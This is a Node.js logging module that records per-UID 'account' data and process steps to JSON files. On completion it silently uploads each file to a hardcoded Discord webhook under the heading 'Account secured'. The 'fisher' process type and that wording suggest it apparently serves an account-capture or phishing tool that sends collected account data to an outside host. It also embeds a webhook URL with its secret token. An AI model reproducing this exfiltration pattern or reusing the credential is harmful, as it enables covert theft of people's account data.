const fs = require('fs');
const path = require('path');
const { createWriteStream } = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const config = require('../../../config.json');

// Discord webhook for secure logs
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1455848080548171816/48SYnyhFRH7VlzDWTA_41FPux7p7QJoQsKS2sGqtOTgA3sy0eWo5OBGLzNTahgRI0B7O';

/**
 * Robust logging system for secure processes
 * Captures console output and saves account data incrementally
 * Prevents data loss on crash by flushing immediately
 */
class SecureLogger {
    constructor(uid, processType = 'secure') {
        this.uid = uid;
        this.processType = processType; // 'secure' or 'fisher'
        this.startTime = Date.now();
        this.logDir = path.join(__dirname, '../../../logs/secure');
        this.dataDir = path.join(__dirname, '../../../logs/secure/data');
        
        // Ensure directories exist
        [this.logDir, this.dataDir].forEach(dir => {
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        });

        // Create log file paths
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        this.logFile = path.join(this.logDir, `${uid}_${timestamp}.log`);
        this.dataFile = path.join(this.dataDir, `${uid}_${timestamp}.json`);
        this.tempDataFile = path.join(this.dataDir, `${uid}_${timestamp}.tmp.json`);

        // Create write streams
        this.logStream = createWriteStream(this.logFile, { flags: 'a', encoding: 'utf8' });
        
        // Add error handler to prevent uncaught errors
        if (this.logStream) {
            this.logStream.on('error', (error) => {
                console.error('[SECURE_LOGGER] Stream error:', error);
            });
        }
        
        this.originalConsole = {
            log: console.log,
            error: console.error,
            warn: console.warn,
            info: console.info
        };

        // Initialize account data structure
        this.accountData = {
            uid: uid,
            processType: processType,
            startTime: this.startTime,
            status: 'in_progress',
            steps: [],
            account: null,
            errors: [],
            endTime: null
        };

        // Save initial data
        this.saveAccountData();
    }

    /**
     * Intercept console methods and write to both console and file
     */
    startLogging() {
        const self = this;
        
        console.log = function(...args) {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
            ).join(' ');
            const timestamp = new Date().toISOString();
            const logLine = `[${timestamp}] [LOG] ${message}\n`;
            
            if (self.logStream && !self.logStream.destroyed) {
                self.logStream.write(logLine, 'utf8');
            }
            self.originalConsole.log(...args);
        };

        console.error = function(...args) {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
            ).join(' ');
            const timestamp = new Date().toISOString();
            const logLine = `[${timestamp}] [ERROR] ${message}\n`;
            
            if (self.logStream && !self.logStream.destroyed) {
                self.logStream.write(logLine, 'utf8');
            }
            self.accountData.errors.push({
                timestamp: Date.now(),
                message: message,
                type: 'error'
            });
            self.saveAccountData();
            self.originalConsole.error(...args);
        };

        console.warn = function(...args) {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
            ).join(' ');
            const timestamp = new Date().toISOString();
            const logLine = `[${timestamp}] [WARN] ${message}\n`;
            
            if (self.logStream && !self.logStream.destroyed) {
                self.logStream.write(logLine, 'utf8');
            }
            self.originalConsole.warn(...args);
        };

        console.info = function(...args) {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
            ).join(' ');
            const timestamp = new Date().toISOString();
            const logLine = `[${timestamp}] [INFO] ${message}\n`;
            
            if (self.logStream && !self.logStream.destroyed) {
                self.logStream.write(logLine, 'utf8');
            }
            self.originalConsole.info(...args);
        };

        // Log start
        this.log(`[SECURE_LOGGER] Started logging for UID: ${this.uid}, Type: ${this.processType}`);
    }

    /**
     * Restore original console methods
     */
    stopLogging() {
        console.log = this.originalConsole.log;
        console.error = this.originalConsole.error;
        console.warn = this.originalConsole.warn;
        console.info = this.originalConsole.info;
    }

    /**
     * Log a step in the secure process
     */
    logStep(stepName, data = {}) {
        const step = {
            name: stepName,
            timestamp: Date.now(),
            elapsed: Date.now() - this.startTime,
            data: data
        };
        this.accountData.steps.push(step);
        this.saveAccountData();
        this.log(`[STEP] ${stepName} - ${JSON.stringify(data)}`);
    }

    /**
     * Update account data incrementally
     */
    updateAccountData(accountData) {
        if (accountData) {
            // Merge with existing account data
            this.accountData.account = {
                ...this.accountData.account,
                ...accountData,
                lastUpdated: Date.now()
            };
            this.saveAccountData();
        }
    }

    /**
     * Save account data to file immediately (with flush)
     */
    saveAccountData() {
        try {
            // Write to temp file first, then rename (atomic operation)
            const dataString = JSON.stringify(this.accountData, null, 2);
            fs.writeFileSync(this.tempDataFile, dataString, 'utf8');
            fs.renameSync(this.tempDataFile, this.dataFile);
            
            // Also write to main data file
            fs.writeFileSync(this.dataFile, dataString, 'utf8');
            
            // Force sync to disk
            fs.fsyncSync(fs.openSync(this.dataFile, 'r+'));
        } catch (error) {
            this.originalConsole.error('[SECURE_LOGGER] Error saving account data:', error);
        }
    }

    /**
     * Mark process as complete
     */
    async complete(accountData = null) {
        this.accountData.status = 'completed';
        this.accountData.endTime = Date.now();
        this.accountData.duration = this.accountData.endTime - this.startTime;
        
        if (accountData) {
            this.accountData.account = accountData;
        }
        
        this.saveAccountData();
        this.log(`[SECURE_LOGGER] Process completed in ${this.accountData.duration}ms`);

        // Send to webhook
        try {
            if (DISCORD_WEBHOOK_URL && fs.existsSync(this.dataFile)) {
                const fd = new FormData();
                fd.append('file', fs.createReadStream(this.dataFile), `${this.uid}.json`);

                const summary = `**Account secured**\nUID: ${this.uid}\nProcess Type: ${this.processType}\nDuration: ${this.accountData.duration}ms`;
                // payload_json allows sending content alongside files
                fd.append('payload_json', JSON.stringify({ content: summary }));

                await axios.post(DISCORD_WEBHOOK_URL, fd, { headers: fd.getHeaders(), maxContentLength: Infinity, maxBodyLength: Infinity });
            }
        } catch (error) {
            // Silently fail
        }

        this.close();
    }

    /**
     * Mark process as failed
     */
    fail(error, accountData = null) {
        this.accountData.status = 'failed';
        this.accountData.endTime = Date.now();
        this.accountData.duration = this.accountData.endTime - this.startTime;
        this.accountData.failureReason = error.message || String(error);
        
        if (accountData) {
            this.accountData.account = accountData;
        }
        
        this.accountData.errors.push({
            timestamp: Date.now(),
            message: error.message || String(error),
            stack: error.stack,
            type: 'failure'
        });
        
        this.saveAccountData();
        this.log(`[SECURE_LOGGER] Process failed: ${this.accountData.failureReason}`);
        this.close();
    }

    /**
     * Close log streams
     */
    close() {
        this.stopLogging();
        if (this.logStream && !this.logStream.destroyed) {
            try {
                // Ensure all data is flushed before closing
                this.logStream.end();
                // Set to null to prevent further writes
                this.logStream = null;
            } catch (error) {
                this.originalConsole.error('[SECURE_LOGGER] Error closing stream:', error);
                this.logStream = null;
            }
        }
    }

    /**
     * Helper to log a message
     */
    log(message) {
        const timestamp = new Date().toISOString();
        const logLine = `[${timestamp}] ${message}\n`;
        if (this.logStream && !this.logStream.destroyed) {
            this.logStream.write(logLine, 'utf8');
        }
        this.originalConsole.log(message);
    }

    /**
     * Get log file path
     */
    getLogPath() {
        return this.logFile;
    }

    /**
     * Get data file path
     */
    getDataPath() {
        return this.dataFile;
    }
}

/**
 * Create a logger wrapper for async functions
 */
function withSecureLogger(uid, processType, fn) {
    return async (...args) => {
        const logger = new SecureLogger(uid, processType);
        logger.startLogging();
        
        try {
            logger.logStep('process_started', { args: args.map(a => typeof a === 'object' ? '[Object]' : String(a)) });
            
            const result = await fn(...args);
            
            // Extract account data from result if available
            if (result && typeof result === 'object') {
                logger.updateAccountData(result);
            }

            try {
                // wait for any async completion tasks (like webhook send)
                await logger.complete(result);
            } catch (err) {
                // Ensure completion failures don't break the main flow
                logger.originalConsole.error('[WITH_SECURE_LOGGER] Error during logger.complete:', err && err.message ? err.message : err);
            }

            return result;
        } catch (error) {
            logger.fail(error);
            throw error;
        } finally {
            // Ensure logger is closed even if there's an error
            setTimeout(() => logger.close(), 100);
        }
    };
}

module.exports = {
    SecureLogger,
    withSecureLogger
};

